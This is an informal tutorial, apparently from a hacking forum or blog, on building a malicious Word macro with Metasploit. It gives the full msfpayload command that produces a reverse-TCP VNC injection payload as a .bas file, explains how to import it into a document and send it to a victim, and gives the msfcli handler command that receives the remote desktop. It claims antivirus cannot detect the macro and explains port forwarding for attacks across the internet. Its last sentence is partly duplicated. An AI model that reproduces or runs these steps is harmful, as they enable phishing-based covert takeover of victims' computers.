Today i will show u how to use Metasploit payload feature for Reverse VNC connection which can be hidden in a Word file and get VNC desktop of the remote user

Metasploit will create a macro for Word, which once implemented when a user opens the word file we get a reverse VNC of the target system ,where the Word file contains the macro, even antvirus cant detect It,

there is no required of VNC installed in the Victim PC
u can also do this in WAN also only thing is u should port forward ur 4444 port in ur modem or router

Lets begin

1) Create a Macro to Intergate with word

./msfpayload windows/vncinject/reverse_tcp LHOST=192.168.147.128 V > /tmp/punter.bas

2) copy that punter.bas file in windows now go to windows
and open ur office 2003 –>tools–>macro–>visualbasic editor
then go to File–>import file–> and choose the punter.bas and save it with a name ex: macrogame.doc
now send this file to victim via mail or some other technique for this demo i will open in my system

3)now in Backtrack type this command

./msfcli multi/handler PAYLOAD=windows/vncinject/reverse_tcp LHOST=192.168.147.128 DisableCourtesyShell=True E

When the target on the windows open the file, it will be asked if he/she wished to accept or not run the macro, if it accepts, the connection will be initiated, and the VNC client will open on the post BackTrack.
not run the macro, if it accepts, the connection will be initiated, and the VNC client will open on the post BackTrack.
